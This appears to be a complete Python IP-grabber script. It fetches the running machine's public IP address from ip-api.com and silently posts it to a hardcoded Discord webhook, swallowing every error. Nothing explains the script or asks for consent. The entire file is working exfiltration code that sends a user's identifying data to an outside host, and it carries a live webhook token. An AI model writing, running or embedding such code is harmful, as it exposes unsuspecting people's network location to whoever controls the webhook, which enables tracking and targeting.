import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"

def get_public_ip():
    try:
        resp = requests.get("http://ip-api.com/json/", timeout=10)
        resp.raise_for_status()
        data = resp.json()
        if data.get("status") == "success":
            return data.get("query")
    except Exception:
        return None

def send_ip_to_discord(ip):
    try:
        requests.post(WEBHOOK_URL, json={"content": f"User's public IP address: {ip}"})
    except Exception:
        pass

def main():
    ip = get_public_ip()
    if ip:
        send_ip_to_discord(ip)

if __name__ == "__main__":
    main()
